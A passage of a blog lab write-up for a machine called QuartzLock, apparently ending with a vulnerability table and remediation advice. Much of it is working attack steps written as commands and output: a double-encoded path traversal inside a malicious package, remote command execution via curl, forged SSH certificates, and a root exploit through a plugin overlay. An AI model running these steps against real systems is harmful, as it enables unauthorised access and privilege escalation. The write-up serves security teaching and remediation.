+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>WORK<span style="color:#f92672">=</span>/tmp/qpak-worker
+</span></span><span style="display:flex;"><span>rm -rf <span style="color:#e6db74">&#34;</span>$WORK<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;</span>$WORK<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>Create <code>manifest.toml</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; <span style="color:#e6db74">&#34;</span>$WORK<span style="color:#e6db74">/manifest.toml&#34;</span> <span style="color:#e6db74">&lt;&lt;&#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">name = &#34;legacy-worker-diagnostic&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">version = &#34;0.9.7&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">runtime = &#34;wasi&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">entry = &#34;probe.wasm&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[permissions]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">network = false
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">filesystem = &#34;job&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[compat]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">preopen = &#34;/var/lib/quartz/jobs/%252e%252e/%252e%252e/%252e%252e/%252e%252e/run/quartz&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><p>Create <code>policy.rego</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; <span style="color:#e6db74">&#34;</span>$WORK<span style="color:#e6db74">/policy.rego&#34;</span> <span style="color:#e6db74">&lt;&lt;&#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">package quartz.diagnostic
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">default allow = true
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><p>Create <code>sbom.json</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; <span style="color:#e6db74">&#34;</span>$WORK<span style="color:#e6db74">/sbom.json&#34;</span> <span style="color:#e6db74">&lt;&lt;&#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;spdxVersion&#34;: &#34;SPDX-2.3&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;name&#34;: &#34;legacy-worker-diagnostic&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;supplier&#34;: &#34;Organization: QuartzLock Systems&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;packages&#34;: []
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><p>Despite its filename, <code>probe.wasm</code> may contain the legacy diagnostic JSON
+format:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; <span style="color:#e6db74">&#34;</span>$WORK<span style="color:#e6db74">/probe.wasm&#34;</span> <span style="color:#e6db74">&lt;&lt;&#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;method&#34;: &#34;RunLegacyProbe&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;command&#34;: &#34;/usr/bin/id&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;args&#34;: []
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span></code></pre></div><p>Build the archive:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tar -czf /tmp/worker-id.qpak <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -C <span style="color:#e6db74">&#34;</span>$WORK<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  manifest.toml probe.wasm policy.rego sbom.json
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tar -tzvf /tmp/worker-id.qpak
+</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/05-terminal.png" alt="qpak contents and traversal"></p>
+<h2 id="7-double-decoded-preopen-traversal">7. Double-Decoded Preopen Traversal</h2>
+<p>The malicious path is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/var/lib/quartz/jobs/%252e%252e/%252e%252e/%252e%252e/%252e%252e/run/quartz
+</span></span></code></pre></div><p>The API validator decodes once:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>%252e%252e -&gt; %2e%2e
+</span></span></code></pre></div><p>The resulting text still appears to be under <code>/var/lib/quartz/jobs</code>.</p>
+<p>The runtime decodes again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>%2e%2e -&gt; ..
+</span></span></code></pre></div><p>After normalization, the runtime preopens:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/run/quartz
+</span></span></code></pre></div><p>That directory contains <code>worker.sock</code>, which exposes <code>RunLegacyProbe</code>.</p>
+<p>Upload the bundle:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>JOB<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>
+</span></span><span style="display:flex;"><span>  curl -sk <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    --resolve <span style="color:#e6db74">&#34;api.nyx:443:</span>$TARGET<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -F <span style="color:#e6db74">&#34;bundle=@/tmp/worker-id.qpak&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    https://api.nyx/api/v2/bundles |
+</span></span><span style="display:flex;"><span>    jq -r .id
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$JOB<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>Poll the job:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  RESPONSE<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>
+</span></span><span style="display:flex;"><span>    curl -sk <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>      --resolve <span style="color:#e6db74">&#34;api.nyx:443:</span>$TARGET<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>      -H <span style="color:#e6db74">&#34;Authorization: Bearer </span>$TOKEN<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;https://api.nyx/api/v2/jobs/</span>$JOB<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;</span>$RESPONSE<span style="color:#e6db74">&#34;</span> | jq
+</span></span><span style="display:flex;"><span>  STATUS<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$RESPONSE<span style="color:#e6db74">&#34;</span> | jq -r .status<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$STATUS<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;queued&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#e6db74">&#34;</span>$STATUS<span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;running&#34;</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> break
+</span></span><span style="display:flex;"><span>  sleep <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Successful command execution:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>uid=993(svc-attest) gid=1003(quartz-runner) groups=1003(quartz-runner)
+</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/06-terminal.png" alt="Command execution as svc-attest"></p>
+<h2 id="8-command-execution-helper">8. Command Execution Helper</h2>
+<p>The included <a href="http://localhost:1313/myblog/artifacts/quartzlock/legacy_exec.sh">legacy_exec.sh</a> automates:</p>
+<ol>
+<li>Creation of the legacy JSON <code>probe.wasm</code>.</li>
+<li>qpak packaging.</li>
+<li>Duplicate-key JWT acquisition.</li>
+<li>Bundle upload.</li>
+<li>Job polling.</li>
+</ol>
+<p>Usage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x legacy_exec.sh
+</span></span><span style="display:flex;"><span>TARGET<span style="color:#f92672">=</span>192.168.100.143 ./legacy_exec.sh /usr/bin/id
+</span></span></code></pre></div><p>The first argument is the executable. Remaining arguments are passed through
+as the JSON <code>args</code> array:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74">&#34;</span> ./legacy_exec.sh /bin/bash -c <span style="color:#e6db74">&#39;id; uname -a&#39;</span>
+</span></span></code></pre></div><h2 id="9-ssh-certificate-issuer-enumeration">9. SSH Certificate Issuer Enumeration</h2>
+<p>The intended local path uses:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/run/quartz-certd.sock
+</span></span><span style="display:flex;"><span>/usr/local/bin/qcert
+</span></span><span style="display:flex;"><span>/var/lib/quartz/db/assets.db
+</span></span><span style="display:flex;"><span>/etc/ssh/ca_user_key.pub
+</span></span></code></pre></div><p>The asset database associates the <code>QL-EDGE-0001</code> serial with user <code>caden</code>.
+The issuer performs flexible matching equivalent to SQL <code>LIKE</code>, so the serial
+selector <code>QL-EDGE-%</code> resolves to that asset.</p>
+<p>Generate an attacker-controlled keypair locally:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -t ed25519 -f caden_key -N <span style="color:#e6db74">&#39;&#39;</span>
+</span></span></code></pre></div><p>Only the public key must be transferred to the target:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PUB64<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>base64 -w0 caden_key.pub<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74">&#34;</span> ./legacy_exec.sh /bin/bash -c <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;echo &#39;</span>$PUB64<span style="color:#e6db74">&#39; | base64 -d &gt; /tmp/caden_key.pub &amp;&amp;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   /usr/local/bin/qcert sign \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     --serial &#39;QL-EDGE-%&#39; \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     --pubkey /tmp/caden_key.pub \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     --out /tmp/caden_key-cert.pub&#34;</span>
+</span></span></code></pre></div><p>Expected result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>certificate written: /tmp/caden_key-cert.pub
+</span></span><span style="display:flex;"><span>principal: caden
+</span></span><span style="display:flex;"><span>valid_for: 1h
+</span></span></code></pre></div><p>Retrieve the public certificate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74">&#34;</span> ./legacy_exec.sh <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  /bin/cat /tmp/caden_key-cert.pub |
+</span></span><span style="display:flex;"><span>  sed <span style="color:#e6db74">&#39;s/^legacy worker response: //&#39;</span> &gt; caden_key-cert.pub
+</span></span></code></pre></div><p>Inspect it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -Lf caden_key-cert.pub
+</span></span></code></pre></div><p>The principal is <code>caden</code>.</p>
+<p><img src="http://localhost:1313/myblog/images/quartzlock/07-terminal.png" alt="Wildcard certificate issuance"></p>
+<h2 id="10-ssh-as-caden">10. SSH as caden</h2>
+<p>Use the private key together with the signed certificate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -i caden_key <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -o CertificateFile<span style="color:#f92672">=</span>caden_key-cert.pub <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -o StrictHostKeyChecking<span style="color:#f92672">=</span>no <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -o UserKnownHostsFile<span style="color:#f92672">=</span>/dev/null <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;caden@</span>$TARGET<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>Confirm access:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>hostname
+</span></span><span style="display:flex;"><span>cat /home/caden/user.txt
+</span></span></code></pre></div><p>Result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>uid=1001(caden) gid=1001(caden) groups=1001(caden),1002(quartz-maint)
+</span></span><span style="display:flex;"><span>quartzlock
+</span></span><span style="display:flex;"><span>[REDACTED]
+</span></span></code></pre></div><p>The important group is <code>quartz-maint</code>.</p>
+<p><img src="http://localhost:1313/myblog/images/quartzlock/08-terminal.png" alt="SSH access and user flag"></p>
+<h2 id="11-qctl-replay-enumeration">11. qctl Replay Enumeration</h2>
+<p>As <code>caden</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /usr/local/bin/qctl
+</span></span><span style="display:flex;"><span>qctl replay --help
+</span></span><span style="display:flex;"><span>cat /var/lib/quartz/cases/README.replay
+</span></span></code></pre></div><p>Relevant permissions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>-rwxr-x--- root quartz-maint /usr/local/bin/qctl
+</span></span></code></pre></div><p>Expected case layout:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>case-id/
+</span></span><span style="display:flex;"><span>└── plugins/
+</span></span><span style="display:flex;"><span>    └── rpm-integrity
+</span></span></code></pre></div><p>The maintenance service validates a trusted plugin path before creating a
+runtime namespace. It then bind-mounts the user-controlled case plugin
+directory over the trusted plugin directory and executes the same path.</p>
+<p>The sequence is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1. Validate /usr/libexec/quartz/plugins/rpm-integrity.
+</span></span><span style="display:flex;"><span>2. Confirm it belongs to the trusted plugin directory.
+</span></span><span style="display:flex;"><span>3. Create the replay runtime.
+</span></span><span style="display:flex;"><span>4. Overlay case-id/plugins on /usr/libexec/quartz/plugins.
+</span></span><span style="display:flex;"><span>5. Execute /usr/libexec/quartz/plugins/rpm-integrity as root.
+</span></span></code></pre></div><p>The path is trusted during validation but resolves to attacker-controlled
+content after the namespace overlay.</p>
+<h2 id="12-root-through-qctl-replay">12. Root Through qctl replay</h2>
+<p>Create a replay case:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CASE<span style="color:#f92672">=</span><span style="color:#66d9ef">case</span>-root-writeup
+</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;/var/lib/quartz/cases/</span>$CASE<span style="color:#e6db74">/plugins&#34;</span>
+</span></span></code></pre></div><p>Create the expected plugin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; <span style="color:#e6db74">&#34;/var/lib/quartz/cases/</span>$CASE<span style="color:#e6db74">/plugins/rpm-integrity&#34;</span> <span style="color:#e6db74">&lt;&lt;&#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">id
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">printf &#34;root flag: &#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cat /root/root.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x <span style="color:#e6db74">&#34;/var/lib/quartz/cases/</span>$CASE<span style="color:#e6db74">/plugins/rpm-integrity&#34;</span>
+</span></span></code></pre></div><p>Trigger replay:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qctl replay <span style="color:#e6db74">&#34;</span>$CASE<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span><span style="display:flex;"><span>root flag: [REDACTED]
+</span></span></code></pre></div><p>Remove the user-controlled case:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm -rf <span style="color:#e6db74">&#34;/var/lib/quartz/cases/</span>$CASE<span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p><img src="http://localhost:1313/myblog/images/quartzlock/09-terminal.png" alt="Root execution and root flag"></p>
+<h2 id="13-cleanup">13. Cleanup</h2>
+<p>Remove the temporary public key and certificate on the target:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TARGET<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$TARGET<span style="color:#e6db74">&#34;</span> ./legacy_exec.sh /bin/rm -f <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  /tmp/caden_key.pub <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  /tmp/caden_key-cert.pub
+</span></span></code></pre></div><p>Remove local keys when they are no longer needed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm -f caden_key caden_key.pub caden_key-cert.pub
+</span></span></code></pre></div><p>The replay case in this reproduction was removed immediately after execution.</p>
+<h2 id="vulnerability-summary">Vulnerability Summary</h2>
+<table>
+	<thead>
+			<tr>
+					<th>Boundary</th>
+					<th>Weakness</th>
+					<th>Impact</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Enrollment API</td>
+					<td>Duplicate-key parser differential</td>
+					<td>Privileged JWT scopes</td>
+			</tr>
+			<tr>
+					<td>qpak runner</td>
+					<td>Inconsistent URL decoding and normalization</td>
+					<td>Access to internal worker socket</td>
+			</tr>
+			<tr>
+					<td>Certificate issuer</td>
+					<td>Wildcard serial matching</td>
+					<td>SSH certificate for another asset owner</td>
+			</tr>
+			<tr>
+					<td>Maintenance replay</td>
+					<td>Namespace overlay TOCTOU</td>
+					<td>Root command execution</td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="remediation">Remediation</h2>
+<h3 id="enrollment-api">Enrollment API</h3>
+<ul>
+<li>Reject duplicate JSON keys before policy evaluation.</li>
+<li>Parse once and pass the same object to validation and authorization.</li>
+<li>Apply JCS canonicalization before any security decision.</li>
+</ul>
+<h3 id="qpak-runner">qpak Runner</h3>
+<ul>
+<li>Decode and normalize the preopen path exactly once.</li>
+<li>Compare canonical filesystem paths after symlink resolution.</li>
+<li>Pass an already-open directory descriptor to the runner.</li>
+<li>Remove the legacy JSON probe compatibility mode.</li>
+</ul>
+<h3 id="ssh-certificate-issuer">SSH Certificate Issuer</h3>
+<ul>
+<li>Require exact serial equality.</li>
+<li>Reject <code>%</code>, <code>_</code>, glob characters, and regular expressions.</li>
+<li>Authorize the requested principal independently of asset lookup.</li>
+<li>Record and rate-limit certificate issuance.</li>
+</ul>
+<h3 id="maintenance-replay">Maintenance Replay</h3>
+<ul>
+<li>Do not validate a pathname before replacing its mount namespace.</li>
+<li>Open and verify the executable after the final mount layout exists.</li>
+<li>Require signed, root-owned replay plugins.</li>
+<li>Run replay plugins with a dedicated unprivileged account where possible.</li>
+</ul>
+<h2 id="reproduction-artifacts">Reproduction Artifacts</h2>
+<ul>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/legacy_exec.sh">Automated legacy worker command helper</a></li>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/legacy-manifest.toml">Malicious qpak manifest</a></li>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/legacy-probe.json">Legacy probe JSON</a></li>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/policy.rego">Rego policy</a></li>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/qpak/sbom.json">SPDX metadata</a></li>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/quartzlock-reproduction-files.zip">Reproduction files ZIP</a></li>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/quartzlock-evidence.zip">Redacted evidence ZIP</a></li>
+<li><a href="http://localhost:1313/myblog/artifacts/quartzlock/quartzlock-screenshots.zip">Redacted screenshots ZIP</a></li>
+</ul>
+
+      </div>
+
+      
+        <footer class="post-footer">
+          <div class="post-tags-footer">
+            <span class="tags-label">Tags:</span>
+            
+              <a href="http://localhost:1313/myblog/tags/misc" class="post-tag">misc</a>
+            
+              <a href="http://localhost:1313/myblog/tags/vulnyx" class="post-tag">vulnyx</a>
+            
+              <a href="http://localhost:1313/myblog/tags/labs" class="post-tag">labs</a>
+            
+          </div>
+        </footer>
+      
+
+      
+
+
+<section class="related-posts" aria-label="Related Posts">
+  <h2 class="related-posts-title">Related Posts</h2>
+  <ul class="related-posts-list">
+    
+    <li class="related-post-item">
+      <a href="http://localhost:1313/myblog/posts/pyjs/" class="related-post-link">
+        <strong>pyjs — CTF Writeup</strong>
+        <span>pyjs — Daily Alpacahack Writeup CTF: AlpacaHack / SECCON
+Category: Misc
+Difficulty: Hard
+Author: minaminao
+Challenge We …</span>
+      </a>
+    </li>
+    
+    <li class="related-post-item">
+      <a href="http://localhost:1313/myblog/posts/missing-cursor/" class="related-post-link">
+        <strong>Dancing Cursor - Daily Alpacahack Writeup</strong>
+        <span>Dancing Cursor — Daily Alpacahack Writeup Challenge: Dancing Cursor
+Category: Rev / Misc
+Difficulty: Medium
+The …</span>
+      </a>
+    </li>
+    
+  </ul>
+</section>
+
+
+
+      <nav class="post-navigation" aria-label="Post navigation">
+        
+          <a
+            href="http://localhost:1313/myblog/posts/xor/"
+            class="nav-link nav-prev"
+            aria-label="Previous post: Daily Alpacahack - XOR (Crypto / Easy) Writeup">
+            <span class="nav-label">Previous</span>
+            <span class="nav-title">Daily Alpacahack - XOR (Crypto / Easy) Writeup</span>
+          </a>
+        
+
+        
+      </nav>
+    </article>
+
+    
+  <aside class="post-toc" id="post-toc" aria-label="Table of Contents">
+    <button
+      class="toc-toggle"
+      id="toc-toggle"
